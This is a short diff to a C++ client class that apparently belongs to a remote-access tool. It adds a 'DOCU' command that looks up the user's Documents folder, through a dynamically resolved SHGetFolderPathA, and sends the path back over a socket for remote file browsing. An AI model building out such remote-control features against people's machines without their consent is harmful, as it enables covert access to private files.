@@ -460,6 +460,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             this->cChunkSend(this->sckSocket, strPathBCDesk.c_str(), static_cast<int>(strPathBCDesk.size()), 0, true, nullptr, EnumComandos::FM_CPATH);
             std::this_thread::sleep_for(std::chrono::milliseconds(10));
         }
+        else if (strIn_c == "DOCU") {
+            strPath = this->ObtenerDocs();
+            std::string strPathBCDocs = strPath;
+            this->cChunkSend(this->sckSocket, strPathBCDocs.c_str(), static_cast<int>(strPathBCDocs.size()), 0, true, nullptr, EnumComandos::FM_CPATH);
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        }
         else {
             strPath = strIn_c;
         }
@@ -1789,12 +1795,22 @@ std::string Cliente::ObtenerDown() {
             }
             else {
                 return std::string("-");
-            };
+            }
         }
     }
     else {
         return std::string("-");
     }
+}
+
+std::string Cliente::ObtenerDocs() {
+    TCHAR szTemp[MAX_PATH];
+    if (this->mod_dynamic->SHELL32.pSHGetFolderPathA) {
+        if (this->mod_dynamic->SHELL32.pSHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, szTemp) == S_OK) {
+            return std::string(szTemp) + "\\";
+        }
+    }
+    return std::string("-");
 }
 
 
